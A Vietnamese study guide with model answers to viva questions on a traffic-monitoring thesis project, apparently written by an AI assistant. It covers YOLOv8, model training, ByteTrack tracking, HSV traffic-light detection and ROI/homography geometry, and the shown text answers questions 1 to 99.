# ĐÁP ÁN CHI TIẾT — 200 CÂU HỎI VẤN ĐÁP SMARTTRAFFIC-AI

> Lưu ý trung thực: file này **không kèm link YouTube** vì mình không thể xác minh hàng trăm URL thật một cách đáng tin cậy trong một lần — bịa link sẽ nguy hiểm hơn là không có. Nếu bạn muốn, mình có thể **web-search và xác nhận link thật** cho một nhóm câu cụ thể (ví dụ 10-15 câu bạn thấy khó nhất) ở lượt sau.
> Đáp án bám sát code thật trong repo `smart-traffic` và số liệu trong báo cáo của bạn. Học theo Ý CHÍNH, đừng học thuộc lòng — hội đồng sẽ hỏi vặn lại nếu thấy bạn trả lời như đọc học thuộc.

---

## A. KIẾN THỨC NỀN TẢNG CV & DEEP LEARNING

**1.** Ảnh số là ma trận 3 chiều (H×W×C). Ảnh RGB 640×640 có 640×640×3 = 1.228.800 giá trị, mỗi giá trị 0-255 (8-bit/kênh).

**2.** Classification: gán 1 nhãn cho toàn ảnh. Detection: vừa định vị (bbox) vừa phân loại nhiều vật thể. Semantic Segmentation: gán nhãn từng pixel nhưng không phân biệt instance. Instance Segmentation: phân biệt từng cá thể + mask từng pixel. Đồ án bạn = Object Detection (+ Tracking để theo dõi theo thời gian).

**3.** Định dạng chuẩn dùng nội bộ là `(x1,y1,x2,y2)` — góc trên-trái và góc dưới-phải (dạng "xyxy"), thấy rõ qua `box.xyxy[0]` trong `tracker.py`. YOLO lưu trữ nhãn training theo `(x_center,y_center,w,h)` chuẩn hóa [0,1], nhưng khi inference Ultralytics trả về `xyxy` cho tiện vẽ/so sánh.

**4.** IoU = Diện tích giao / Diện tích hợp của 2 box. Giá trị 0-1, càng gần 1 càng khớp. Dùng để đánh giá độ chính xác localization và làm ngưỡng loại bỏ box trùng (NMS).

**5.** NMS loại các box trùng lặp cho cùng 1 vật thể (model thường dự đoán nhiều box chồng lấn quanh 1 xe). Không có NMS → 1 xe bị đếm thành nhiều xe, phá vỡ toàn bộ logic đếm/PCU/tracking.

**6.** Convolution trượt kernel nhỏ qua ảnh, chia sẻ trọng số (weight sharing) → giảm tham số so với FC, đồng thời có tính bất biến dịch chuyển (translation invariance) — 1 xe máy ở góc nào trong ảnh vẫn được nhận diện bằng cùng bộ filter.

**7.** Stride lớn → giảm kích thước feature map nhanh (giảm độ phân giải không gian). Padding giữ nguyên kích thước biên. Kernel lớn → receptive field lớn hơn nhưng tốn tính toán hơn.

**8.** Anchor-based (YOLOv3-v5, Faster R-CNN) dự đoán offset so với các box neo định sẵn. Anchor-free (YOLOv8, FCOS) dự đoán trực tiếp tâm/kích thước hoặc dùng DFL — YOLOv8 là **anchor-free**.

**9.** Feature Pyramid kết hợp feature map ở nhiều tầng độ phân giải khác nhau — tầng nông (shallow) giữ chi tiết nhỏ cho vật thể bé (xe máy ở xa), tầng sâu (deep) có ngữ nghĩa mạnh cho vật thể lớn (xe bus gần). Không có FPN thì model kém với vật thể đa kích thước.

**10.** Transfer Learning: dùng lại trọng số đã học từ 1 tác vụ/dataset lớn (COCO) làm điểm khởi đầu cho tác vụ mới. Đồ án bạn: từ `yolov8s.pt` (pretrained COCO, 80 lớp) fine-tune sang bài toán 8 lớp phương tiện Việt Nam.

**11.** Overfitting: model học thuộc dữ liệu train, không tổng quát hóa. Dấu hiệu: train loss giảm liên tục nhưng val loss ngừng giảm/tăng trở lại — khoảng cách 2 đường cong ngày càng doãng ra.

**12.** Augmentation giúp tăng tính đa dạng dữ liệu ảo, giảm overfitting. 3 kỹ thuật trong `train_vehicle_model.py`: Mosaic (ghép 4 ảnh), HSV augmentation (đổi màu/độ bão hòa), Random Erasing (che ngẫu nhiên mô phỏng occlusion).

**13.** Confidence score = xác suất model tin rằng box đó chứa vật thể × độ chắc chắn về bbox (objectness). Class probability là xác suất điều kiện "nếu có vật thể thì nó thuộc lớp nào". Confidence hiển thị cuối cùng thường là tích của 2 giá trị này.

**14.** Batch size nhỏ → gradient noisy hơn nhưng có thể regularize tốt hơn; lớn → gradient ổn định hơn nhưng cần nhiều bộ nhớ, dễ hội tụ vào minimum "phẳng" kém tổng quát. Learning rate cao → hội tụ nhanh nhưng dễ dao động/phân kỳ; thấp → ổn định nhưng chậm, dễ kẹt local minimum.

**15.** Real-time: xử lý ngay khi dữ liệu đến, độ trễ thấp, thường đánh đổi độ chính xác lấy tốc độ. Hệ thống bạn dùng mô hình "pull-based" xử lý frame theo yêu cầu từ client — gần với real-time nhưng có polling nên không phải streaming tức thời tuyệt đối.

---

## B. KIẾN TRÚC & LÝ THUYẾT YOLOv8

**16.** Backbone (CSPDarknet, trích đặc trưng đa tầng) → Neck (PAN-FPN, hợp nhất đặc trưng đa tỉ lệ) → Head (Decoupled Head, tách nhánh classification và regression, dự đoán class + box + DFL).

**17.** C2f (Cross Stage Partial with 2 convolutions, "faster") có nhiều nhánh gradient song song hơn C3, giữ lại nhiều thông tin gradient hơn qua các bottleneck, giúp học đặc trưng phong phú hơn mà vẫn nhẹ.

**18.** CSPDarknet chia feature map thành 2 phần, chỉ 1 phần đi qua các lớp dense/residual rồi merge lại — giảm trùng lặp gradient thông tin, giảm compute nhưng vẫn giữ được luồng gradient phong phú (giải quyết vấn đề gradient bị lặp lại nhiều lần qua các layer).

**19.** PAN-FPN: FPN đưa thông tin ngữ nghĩa từ tầng sâu xuống tầng nông (top-down); PAN thêm đường bottom-up đưa chi tiết vị trí từ tầng nông lên tầng sâu. Kết hợp cả 2 chiều giúp mọi tầng đều có cả ngữ nghĩa lẫn chi tiết vị trí chính xác.

**20.** Bỏ Anchor giúp giảm số lượng siêu tham số cần tinh chỉnh (tỉ lệ, kích thước anchor phù hợp dataset), giảm số box ứng viên cần NMS, và tổng quát hóa tốt hơn với vật thể có tỉ lệ khung hình bất thường. Head giờ dự đoán trực tiếp khoảng cách 4 cạnh tới tâm ô lưới.

**21.** λ_cls, λ_box, λ_dfl là hệ số trọng số cân bằng độ ảnh hưởng giữa 3 loss thành phần trong tổng loss, vì độ lớn tự nhiên (scale) của L_cls (BCE), L_CIoU và L_DFL khác nhau — nếu không cân bằng, 1 loss có thể lấn át quá trình tối ưu.

**22.** BCE tính cho từng class độc lập (multi-label per anchor point), so sánh xác suất dự đoán với nhãn 0/1 (có/không thuộc lớp đó), giúp xử lý cả trường hợp overlap giữa các class gần nhau.

**23.** IoU Loss chỉ dựa vào diện tích giao/hợp, có thể bằng 0 khi 2 box không chạm nhau (không có gradient hướng dẫn). CIoU thêm phạt khoảng cách tâm và phạt lệch tỉ lệ khung hình (aspect ratio), giúp có gradient hướng dẫn ngay cả khi box chưa chồng lấn — hội tụ nhanh và ổn định hơn.

**24.** DFL biến regression tọa độ (giá trị liên tục) thành bài toán phân loại phân phối rời rạc hóa quanh giá trị thật, dùng cross-entropy trên phân phối này — cho phép model biểu diễn độ không chắc chắn về vị trí biên (ví dụ biên bị mờ/che khuất) tốt hơn regression trực tiếp (L1/L2).

**25.** `lru_cache` giữ model đã load trong RAM/VRAM, tránh phải đọc lại file `.pt` và khởi tạo lại kiến trúc mạng mỗi lần có session mới — việc load model tốn hàng giây, cache giúp các session sau gần như tức thời.

**26.** n/s/m/l/x khác nhau về độ sâu (depth) và độ rộng (width) mạng — n nhỏ nhất/nhanh nhất/kém chính xác nhất, x lớn nhất/chậm nhất/chính xác nhất. Chọn "s" là điểm cân bằng hợp lý giữa độ chính xác và tốc độ để chạy được gần real-time trên phần cứng phổ thông (CPU/GPU tầm trung).

**27.** `persist=True` giữ trạng thái tracker (danh sách track đang theo dõi) giữa các lần gọi `.track()` liên tiếp trên cùng object model — nếu bỏ, mỗi frame tracker sẽ khởi tạo lại từ đầu, mọi track_id sẽ luôn là track mới → mất hoàn toàn khả năng theo dõi xuyên suốt frame.

**28.** conf=0.35 là điểm cân bằng: thấp hơn (0.25) tăng Recall nhưng tăng False Positive (nhiễu, bóng xe, vật thể giống xe); cao hơn (0.5) tăng Precision nhưng bỏ sót nhiều xe ở xa/bị che một phần — với traffic đông đúc VN, giữ Recall khá tốt quan trọng hơn để không bỏ sót vi phạm.

**29.** Biên dưới 0.05 (không phải 0) để tránh người dùng tự đặt threshold = 0 → hệ thống nhận toàn bộ nhiễu nền là "vật thể", làm sập hoàn toàn hiệu năng downstream (density/violation) và có thể gây DoS về mặt tính toán (quá nhiều box giả cần xử lý).

**30.** `box.conf`: độ tin cậy dự đoán (0-1). `box.cls`: chỉ số lớp (index, cần map ra tên qua `model.names`). `box.id`: track_id duy nhất do tracker gán, chỉ có khi dùng `.track()` chứ không có khi chỉ `.predict()`.

**31.** Vì `.cpu()` chuyển tensor từ GPU về CPU, numpy không thể thao tác trực tiếp trên tensor còn nằm trên GPU (khác vùng bộ nhớ). Bỏ qua bước này sẽ gây lỗi runtime (`RuntimeError` yêu cầu chuyển về CPU trước khi convert sang numpy).

**32.** mAP@50 chỉ tính đúng/sai ở ngưỡng IoU=0.5 (khá dễ đạt). mAP@50-95 lấy trung bình mAP ở 10 ngưỡng IoU từ 0.5 đến 0.95 — đòi hỏi box phải khớp rất chính xác ở ngưỡng cao, nên luôn thấp hơn (khó đạt hơn) mAP@50.

**33.** Precision cao = ít báo nhầm vật thể không tồn tại (ít False Positive) — quan trọng để tránh phạt oan. Recall cao = ít bỏ sót vật thể thật (ít False Negative) — quan trọng để không để lọt vi phạm thật. Với hệ thống giám sát pháp lý, thường cần cân bằng nhưng ưu tiên Precision cao hơn cho phần ra quyết định phạt.

**34.** Model COCO gốc học 80 lớp tổng quát (không có "motorcycle kiểu VN", "container_truck" phân biệt riêng), phân bố dữ liệu train khác hẳn cảnh giao thông VN (góc camera, mật độ xe, kiểu dáng xe). Fine-tune trên dataset đúng domain (UA-DETRAC + VN) giúp model chuyên biệt hóa, học đúng đặc trưng thực tế cần nhận diện.

**35.** vehicle_best.pt dựa trên yolov8**s** (lớn hơn, nhiều tham số hơn yolov8**n**), và phải phân biệt 8 lớp thay vì tối ưu 1 tác vụ đơn giản — nhiều tham số hơn + đầu ra phức tạp hơn = nhiều phép tính hơn mỗi frame → FPS thấp hơn. Đây là đánh đổi tốc độ lấy độ chính xác.

---

## C. HUẤN LUYỆN MÔ HÌNH & SIÊU THAM SỐ

**36.** 60 epoch là điểm dừng khi loss/mAP trên validation bắt đầu bão hòa (dựa theo learning curve trong báo cáo). Ít hơn (20) → model chưa hội tụ đủ, underfit. Nhiều hơn (200) → nguy cơ overfitting nếu dataset không đủ đa dạng, đồng thời tốn tài nguyên/thời gian không cần thiết.

**37.** Momentum tích lũy "quán tính" từ các bước gradient trước, giúp vượt qua các vùng gradient nhiễu/nhỏ (local flat) nhanh hơn và giảm dao động (oscillation) khi cập nhật trọng số, giúp hội tụ mượt và nhanh hơn SGD thuần.

**38.** lr0 là learning rate khởi đầu; lrf là tỉ lệ learning rate cuối cùng so với lr0 (thường theo lịch cosine hoặc linear decay). LR giảm dần theo epoch giúp bước nhảy lớn ở đầu (khám phá nhanh) rồi tinh chỉnh nhỏ dần ở cuối (hội tụ chính xác, tránh vọt qua điểm tối ưu).

**39.** Weight Decay thêm 1 số hạng phạt tỉ lệ với bình phương độ lớn trọng số vào loss (L2 regularization) — ép trọng số không quá lớn, giảm khả năng model "ghi nhớ" nhiễu đặc thù của tập train, tăng khả năng tổng quát hóa.

**40.** Mosaic ghép 4 ảnh training thành 1 ảnh lớn rồi resize lại — buộc model học phát hiện vật thể ở nhiều vị trí/tỉ lệ/ngữ cảnh khác nhau trong 1 lần forward, đặc biệt hữu ích cho cảnh giao thông đông xe vì mô phỏng tự nhiên tình huống nhiều vật thể chồng chéo/cắt cạnh khung hình.

**41.** Mô phỏng thay đổi ánh sáng tự nhiên (nắng gắt, râm, đèn đường ban đêm) và điều kiện thời tiết (mưa làm giảm bão hòa màu) — giúp model không bị phụ thuộc quá mức vào điều kiện ánh sáng cố định lúc quay video training.

**42.** Random Erasing che 1 vùng ngẫu nhiên trong ảnh training bằng nhiễu/màu đồng nhất — buộc model học nhận diện vật thể dựa trên phần còn lại nhìn thấy được, mô phỏng trực tiếp tình huống xe máy VN đi sát/che khuất lẫn nhau ngoài đời thật.

**43.** Tăng imgsz lên 1280 → giữ được nhiều chi tiết hơn cho vật thể nhỏ ở xa (tăng độ chính xác, đặc biệt mAP cho vật thể bé), nhưng tăng đáng kể chi phí tính toán (gần như bình phương theo số pixel) → giảm FPS.

**44.** Batch nhỏ làm ước lượng mean/variance trong Batch Normalization kém ổn định hơn (dựa trên ít mẫu hơn mỗi lần), có thể làm gradient noisy hơn và huấn luyện kém ổn định — thường cần giảm learning rate tương ứng khi giảm batch size.

**45.** Định dạng YOLO TXT: mỗi dòng `class_id x_center y_center width height`, tất cả tọa độ **được chuẩn hóa** theo [0,1] so với kích thước ảnh — giúp nhãn độc lập với độ phân giải ảnh gốc.

**46.** Domain gap: UA-DETRAC quay ở nước ngoài (chủ yếu ô tô, ít xe máy, góc camera/ánh sáng khác), còn dữ liệu VN đặc thù nhiều xe máy đi sát nhau. Nếu không cân bằng, model có thể học lệch (bias) về đặc trưng của nguồn dữ liệu chiếm đa số, giảm hiệu quả trên domain còn lại.

**47.** Chuẩn hóa về chung 1 tập nhãn 8 lớp đảm bảo `class_id` nhất quán giữa 2 nguồn — nếu không, cùng 1 số `class_id` có thể ứng với 2 loại xe khác nhau ở 2 dataset, khiến model học nhầm hoàn toàn ý nghĩa các lớp.

**48.** Val dùng để theo dõi và chọn checkpoint/tinh chỉnh hyperparameter trong lúc train; Test đánh giá cuối cùng, độc lập, không được dùng để điều chỉnh gì. Nếu dùng luôn Test để tinh chỉnh → con số đánh giá cuối bị lạc quan giả tạo (data leakage), không phản ánh đúng khả năng tổng quát hóa thực tế.

**49.** Class imbalance: một số lớp có rất nhiều mẫu (`motorcycle`), một số rất ít (`fire_engine`). Model có xu hướng thiên vị dự đoán tốt lớp đa số, Recall của lớp hiếm thường thấp hơn nhiều vì ít ví dụ để học đặc trưng phân biệt.

**50.** Thường phần lớn thời gian mỗi epoch nằm ở **forward + backward pass** (tính toán qua toàn bộ mạng và lan truyền ngược gradient) trên GPU/CPU, đặc biệt với augmentation nặng như Mosaic làm tăng thêm cả thời gian tiền xử lý dữ liệu (data loading/augment) trước khi vào mạng.

---

## D. THEO DÕI ĐA ĐỐI TƯỢNG — BYTETRACK

**51.** Detection chỉ trả lời "có gì, ở đâu" trong 1 frame độc lập, không có khái niệm "đây là cùng 1 xe với frame trước". Tracking gán 1 danh tính (ID) nhất quán xuyên suốt nhiều frame, cần thiết để đếm không trùng, đo tốc độ, và xác định 1 xe đã "cắt vạch" hay chưa.

**52.** Nếu chỉ detect độc lập từng frame, cùng 1 xe có thể bị đếm lại ở mỗi frame nó xuất hiện → số liệu density/count bị thổi phồng gấp nhiều lần so với thực tế; cũng không thể biết xe nào đã đi qua vạch dừng trước đó.

**53.** Kalman Filter dự đoán trạng thái tiếp theo (vị trí ước lượng ở frame kế) dựa trên mô hình chuyển động (thường là vận tốc không đổi) từ các quan sát trước đó, sau đó cập nhật lại dự đoán khi có detection thật khớp vào.

**54.** Trạng thái thường gồm: tọa độ tâm (x,y), tỉ lệ khung hình/diện tích (s hoặc a), và đạo hàm theo thời gian (vận tốc) của các đại lượng trên — cho phép filter ước lượng cả vị trí lẫn xu hướng di chuyển.

**55.** Hungarian Algorithm giải bài toán gán ghép tối ưu (bipartite matching) giữa tập track đang có và tập detection mới ở frame hiện tại, dựa trên ma trận chi phí (thường là 1-IoU) — tìm cách ghép cặp sao cho tổng chi phí nhỏ nhất.

**56.** Tầng 1 ghép các detection **điểm tin cậy cao** với track hiện có bằng IoU. Tầng 2 lấy các track **chưa được ghép** ở tầng 1 và thử ghép tiếp với các detection **điểm tin cậy thấp** còn sót — tận dụng cả các detection "mờ nhạt" mà nếu lọc bỏ ngay từ đầu (như SORT) sẽ làm mất track khi vật thể bị che khuất một phần.

**57.** SORT/DeepSORT thường vứt hẳn detection dưới ngưỡng confidence chuẩn, coi đó là nhiễu — nhưng thực tế nhiều detection điểm thấp lại chính là vật thể thật đang bị che khuất một phần (occlusion) chứ không phải nhiễu, ByteTrack tận dụng lại chúng ở tầng 2 để giữ track không bị đứt.

**58.** ID Switch: 1 vật thể đang được theo dõi bỗng bị gán track_id khác (do mất track tạm thời rồi track lại nhầm, hoặc 2 track giao cắt nhau). ByteTrack giảm ID Switch nhờ tầng 2 giữ được track qua giai đoạn occlusion thay vì phải xóa track và tạo track mới hoàn toàn khi vật thể tái xuất hiện.

**59.** DeepSORT dùng thêm 1 mạng CNN nhỏ trích "vân tay ngoại hình" (appearance embedding) của mỗi vật thể để so khớp ngay cả khi vị trí thay đổi nhiều. ByteTrack không có appearance feature, "bù" lại bằng cách khai thác triệt để thông tin motion (IoU + Kalman) và giữ lại cả detection điểm thấp — đơn giản, nhanh hơn, đổi lại kém mạnh hơn khi 2 vật thể cùng loại giao cắt gần nhau.

**60.** Nếu tracker chưa gán được ID cho bất kỳ box nào ở frame đó (`boxes.id is None`, thường xảy ra ở frame đầu tiên hoặc khi việc theo dõi tạm thời gặp lỗi), code trả về danh sách rỗng thay vì crash khi cố truy cập `.id[0]` trên giá trị None — đây là lập trình phòng thủ (defensive programming) cần thiết.

**61.** ByteTrack giữ track ở trạng thái "lost" trong một khoảng thời gian (track buffer) thay vì xóa ngay, dùng Kalman Filter tiếp tục dự đoán vị trí trong lúc mất dấu; khi vật thể xuất hiện lại gần vị trí dự đoán, nó được ghép lại với track cũ (giữ nguyên track_id) thay vì tạo track mới.

**62.** Track buffer quy định số frame tối đa 1 track được giữ ở trạng thái "lost" trước khi bị xóa vĩnh viễn. Buffer ngắn → track dễ bị xóa và tạo ID mới khi occlusion hơi lâu (nhiều ID switch). Buffer dài → giữ track lâu hơn nhưng tăng nguy cơ ghép nhầm 2 vật thể khác nhau nếu chúng ở gần vị trí dự đoán.

**63.** Nhiều khả năng ByteTrack giữ được track qua occlusion ngắn 1-2 giây nhờ Kalman dự đoán quỹ đạo tiếp diễn, nên khi 2 xe tách ra, track_id thường được giữ nguyên đúng cho từng xe — nhưng nếu 2 xe có quỹ đạo/tốc độ tương tự khi che khuất lâu, có rủi ro ID bị hoán đổi giữa 2 xe.

**64.** Motion model tuyến tính giả định vận tốc không đổi giữa các frame — không phù hợp tốt khi xe rẽ gấp/đổi hướng đột ngột ở nút giao, vì vị trí dự đoán sẽ lệch xa vị trí thật, dễ làm mất ghép (mismatch) hoặc tạo ID switch trong tình huống rẽ.

**65.** Vì ByteTrack chỉ dùng thông tin hình học (IoU, vị trí dự đoán từ Kalman) mà không cần forward 1 mạng CNN riêng để trích đặc trưng ngoại hình cho từng box như DeepSORT — bước association chỉ là các phép toán ma trận nhẹ (Hungarian trên ma trận IoU), rất nhanh trên CPU.

**66.** Chia nguyên `//` chỉ làm tròn xuống tối đa 0.5-1 pixel — sai số không đáng kể so với kích thước bbox thực tế (thường hàng chục pixel), nên không ảnh hưởng đáng kể độ chính xác. Chọn tâm hình học (center) thay vì bottom-center có thể đơn giản hóa code nhưng kém chính xác hơn khi xác định "xe đã đi qua vạch dừng chưa" — bottom-center thường sát mặt đường/bánh xe hơn, phản ánh đúng vị trí tiếp xúc mặt đường hơn tâm hình học.

**67.** Nếu ID switch xảy ra ngay lúc cắt vạch, `previous_centers[track_id]` sẽ chứa vị trí của 1 xe khác (xe cũ đã "nhường" ID này), khiến việc so sánh trước/sau vạch bị sai logic — có thể tạo false positive (báo vi phạm cho xe không thực sự vượt) hoặc bỏ sót vi phạm thật.

**68.** Ngưỡng này yêu cầu khoảng cách di chuyển giữa 2 frame liên tiếp qua vạch phải đủ lớn (>2px) mới tính là "cắt vạch" hợp lệ — nếu bỏ ngưỡng, chỉ cần rung nhẹ bounding box qua lại quanh đúng vạch (do jitter của detection) cũng đủ kích hoạt sự kiện "cắt vạch" liên tục, gây false positive lặp lại.

**69.** Track cũ hết hạn rồi track_id mới được tạo cho cùng 1 xe (hoặc xe khác) — set `logged_red_light_ids`/`logged_wrong_lane_ids` dùng track_id làm khóa, nên track_id mới sẽ không có trong set này, hệ thống có thể ghi log vi phạm lại cho cùng 1 xe nếu nó "đổi ID" trong khi vẫn đang trong tình huống vi phạm.

**70.** Đề xuất: thêm 1 lớp Re-ID nhẹ (embedding ngoại hình đơn giản, ví dụ dựa trên histogram màu hoặc 1 mạng CNN nhỏ) kết hợp với ByteTrack để so khớp lại khi track bị mất dấu lâu, hoặc tăng track buffer có kiểm soát kèm ràng buộc vận tốc hợp lý để giảm ghép nhầm.

---

## E. XỬ LÝ ẢNH CỔ ĐIỂN — HSV & ĐÈN TÍN HIỆU

**71.** Hue (sắc màu, 0-179 trong OpenCV vì OpenCV dùng thang 0-179 cho 8-bit thay vì 0-360), Saturation (độ bão hòa/độ "đậm" của màu), Value (độ sáng).

**72.** Trong HSV, thông tin màu sắc (Hue) tách biệt khỏi thông tin độ sáng (Value) — khi ánh sáng thay đổi (bóng râm, nắng gắt), chủ yếu chỉ Value thay đổi còn Hue của cùng 1 vật thể tương đối ổn định, nên lọc theo Hue bền vững hơn lọc trực tiếp trên RGB (nơi cả 3 kênh đều bị ảnh hưởng bởi ánh sáng).

**73.** Vì màu đỏ nằm ở 2 đầu của vòng tròn Hue (Hue có tính chu kỳ/circular, 0° và 360° đều là đỏ) — trong OpenCV là khoảng gần 0 và gần 180. Một khoảng liên tục duy nhất không thể bao phủ cả 2 đầu này, nên cần 2 khoảng rồi hợp (OR) lại.

**74.** `cv2.inRange()` kiểm tra từng pixel có nằm trong khoảng [lower, upper] cho cả 3 kênh HSV hay không, trả về mask nhị phân (255 nếu thỏa, 0 nếu không) — về bản chất là phép ngưỡng hóa đa chiều (multi-channel thresholding).

**75.** `bitwise_or` gộp 2 mask (từ 2 khoảng Hue đỏ) thành 1 mask duy nhất chứa toàn bộ pixel đỏ (thuộc khoảng 1 HOẶC khoảng 2). Dùng `bitwise_and` sẽ chỉ giữ pixel thỏa **cả 2** khoảng cùng lúc — gần như luôn cho kết quả rỗng vì 1 pixel không thể vừa có Hue gần 0 vừa gần 180.

**76.** `RETR_EXTERNAL` chỉ lấy contour ngoài cùng, bỏ qua các contour lồng bên trong (ví dụ lỗ/vệt sáng bên trong hình tròn đèn) — phù hợp vì ta chỉ quan tâm hình dạng/diện tích tổng thể của cụm màu đèn, không cần chi tiết cấu trúc bên trong.

**77.** Circularity = 1 khi hình dạng là hình tròn hoàn hảo (vì với hình tròn, 4π×area/perimeter² đạt giá trị tối đa = 1 theo bất đẳng thức đẳng chu — isoperimetric inequality). Giá trị càng nhỏ hơn 1 thì hình càng méo/dài/không tròn.

**78.** Đây là thiết kế đánh đổi giữa độ nhạy (recall) và độ chính xác hình dạng: thay vì loại bỏ cứng nhắc mọi contour không đủ tròn (có thể do góc camera làm đèn tròn trông hơi elip, hoặc bị vật cản che một phần), hệ thống vẫn tính điểm nhưng giảm trọng số (×0.5) — vừa không bỏ sót hoàn toàn, vừa ưu tiên các vùng thực sự tròn hơn khi so điểm giữa các màu.

**79.** Nếu đèn ở xa có diện tích pixel nhỏ hơn 15, contour đó bị lọc bỏ hoàn toàn như nhiễu — hệ thống sẽ không phát hiện được trạng thái đèn tín hiệu ở khoảng cách quá xa camera, đây là giới hạn thực tế của phương pháp (cần camera đủ gần/độ phân giải đủ cao).

**80.** Đúng, có rủi ro nhận nhầm nếu trong `light_roi` xuất hiện các vùng màu đỏ/vàng/xanh giả (biển hiệu, đèn LED quảng cáo, phản chiếu ánh nắng) có hình dạng tương đối tròn và diện tích đủ lớn — đây là hạn chế cố hữu của phương pháp dựa hoàn toàn vào màu sắc + hình dạng mà không có ngữ cảnh ngữ nghĩa (semantic) như deep learning.

**81.** Ưu điểm: không cần dữ liệu gán nhãn/huấn luyện riêng, chạy nhanh, dễ giải thích, hoạt động ngay lập tức trên bất kỳ đèn tín hiệu 3 màu chuẩn nào. Nhược điểm: nhạy cảm với điều kiện ánh sáng bất thường, dễ nhầm với vật thể màu tương tự, không "học" được ngữ cảnh (vị trí đèn thường ở đâu trong khung hình) như 1 CNN có thể học ngầm.

**82.** Độ tin cậy giảm đáng kể: ban đêm Value thấp toàn khung hình khiến ngưỡng Saturation/Value tối thiểu (100) khó đạt cho cả đèn thật; ngược sáng làm méo màu sắc thu được của camera; mưa gây nhòe/khúc xạ ánh sáng. Cải tiến: thêm bước cân bằng ánh sáng (histogram equalization/CLAHE) trước khi threshold, hoặc chuyển sang model CNN nhỏ chuyên biệt cho điều kiện thiếu sáng.

**83.** Nếu `light_roi` bị lệch sang vùng có xe màu đỏ đi qua, hệ thống có thể liên tục phát hiện "đèn đỏ" giả trong vùng ROI mỗi khi có xe đỏ đi ngang, làm sai lệch hoàn toàn trạng thái đèn tín hiệu ước lượng — cho thấy độ chính xác của toàn hệ thống phụ thuộc rất nhiều vào việc cấu hình ROI đúng ngay từ đầu (manual calibration).

**84.** HSV threshold gần như không tốn tài nguyên (vài phép so sánh mỗi pixel, O(pixel) đơn giản), có thể chạy hàng nghìn FPS trên CPU cho 1 vùng ROI nhỏ. Một model YOLO riêng cho đèn tín hiệu sẽ tốn thêm 1 lần forward pass mạng neural (dù nhỏ), chậm hơn đáng kể dù chính xác/bền vững hơn trong điều kiện phức tạp.

**85.** Saturation/Value tối thiểu 100 (thay vì 50) giúp loại bỏ các vùng màu nhạt/xám/mờ (ví dụ ánh sáng phản chiếu yếu, sương mù, vùng chuyển màu ở biên vật thể) — chỉ giữ lại các vùng có màu "đậm và sáng" thực sự giống đèn tín hiệu LED thật, giảm false positive từ các vùng màu nhạt ngẫu nhiên trong khung hình.

---

## F. HÌNH HỌC: ROI, POINT-IN-POLYGON, HOMOGRAPHY

**86.** (1) Giới hạn vùng không gian để đếm xe/tính mật độ (loại bỏ xe ở làn đường khác/vỉa hè không liên quan), (2) Giới hạn vùng kiểm tra phân làn để phát hiện vi phạm đi sai làn.

**87.** Tỉ lệ chuẩn hóa [0,1] giúp ROI **độc lập với độ phân giải video cụ thể** — cùng 1 cấu hình `roi_ratio` áp dụng được cho video 720p, 1080p, hay 4K mà không cần tính lại tọa độ pixel; chỉ cần nhân với kích thước frame thực tế lúc chạy.

**88.** Nếu không clamp, tọa độ có thể vượt ra ngoài biên khung hình (ví dụ do làm tròn số hoặc nhập tỉ lệ >1), dẫn tới lỗi index-out-of-bounds khi truy cập mảng pixel ảnh (numpy array), gây crash chương trình.

**89.** `pointPolygonTest` dùng thuật toán tia (ray casting) hoặc winding number để xác định 1 điểm nằm trong, trên biên, hay ngoài 1 đa giác — dựa trên đếm số lần 1 tia từ điểm đó cắt qua các cạnh đa giác (số lẻ = trong, số chẵn = ngoài).

**90.** `measureDist=True` trả về khoảng cách có dấu từ điểm tới cạnh gần nhất của đa giác (dương = trong, âm = ngoài, 0 = trên biên) — tốn thêm tính toán. `measureDist=False` chỉ trả về +1/-1/0 (nhanh hơn). Hệ thống chỉ cần biết trong/ngoài để quyết định đếm hay không, nên dùng `False` để tối ưu tốc độ.

**91.** ROI đa giác n điểm cho phép khớp chính xác hình dạng bất kỳ của làn đường/khu vực thực tế (thường không phải hình chữ nhật do góc camera nghiêng, đường cong, giao lộ nhiều nhánh) — ROI chữ nhật đơn giản dễ bị bao gồm cả vùng không mong muốn (vỉa hè, làn ngược chiều) hoặc bỏ sót 1 phần vùng cần giám sát.

**92.** Chuyển đổi từ góc nhìn nghiêng của camera (perspective view) sang góc nhìn từ trên xuống (bird's-eye/top-down view) — giả định mặt đường là 1 mặt phẳng.

**93.** Ma trận Homography 3×3 có 8 bậc tự do (phần tử thứ 9 thường chuẩn hóa =1). Cần tối thiểu **4 cặp điểm tương ứng** (không có 3 điểm nào thẳng hàng) để giải hệ phương trình tuyến tính xác định 8 tham số này.

**94.** Nếu 4 điểm gần thẳng hàng, ma trận hệ phương trình trở nên gần suy biến (ill-conditioned/near-singular) — kết quả H tính được sẽ rất nhạy với nhiễu nhỏ trong tọa độ đầu vào, gây biến dạng lớn/không ổn định khi áp dụng biến đổi.

**95.** Ở top-down view, khoảng cách pixel tương ứng gần đúng tuyến tính với khoảng cách thực tế trên mặt đường (không bị méo phối cảnh — vật ở xa trông nhỏ hơn vật ở gần trong ảnh gốc), giúp ước lượng khoảng cách/diện tích chiếm dụng của từng xe chính xác và nhất quán hơn trên toàn bộ khung hình.

**96.** Nếu vạch dừng thực tế bị nghiêng trong khung hình (do góc camera), 1 giá trị tỉ lệ chiều cao đơn (đường ngang tuyệt đối) sẽ không khớp hoàn toàn với vạch thật — có thể gây sai số cục bộ ở 2 đầu vạch (1 bên xe "cắt vạch" sớm hơn/muộn hơn thực tế so với bên kia).

**97.** Dựa vào so sánh tọa độ y của center_point giữa frame trước và frame hiện tại so với `line_y`: nếu y trước < line_y và y hiện tại ≥ line_y → xe di chuyển "xuống" (down, theo chiều tăng y ảnh, tức từ trên xuống dưới khung hình); ngược lại là "up".

**98.** Có, cần tính toán/cấu hình lại toàn bộ ROI, vạch dừng, ma trận Homography — vì tất cả các thông số này được thiết lập dựa trên vị trí/góc/tiêu cự cụ thể của 1 camera; đổi góc quay là đổi hoàn toàn ánh xạ không gian ảnh sang không gian thực.

**99.** `roi_ratio` chuẩn hóa giải quyết vấn đề này tự động — vì tỉ lệ là bất biến với độ phân giải, hệ thống chỉ cần nhân tỉ lệ với `frame.shape` thực tế lúc runtime để ra tọa độ pixel đúng, không cần sửa config thủ công khi đổi độ phân giải video đầu vào.

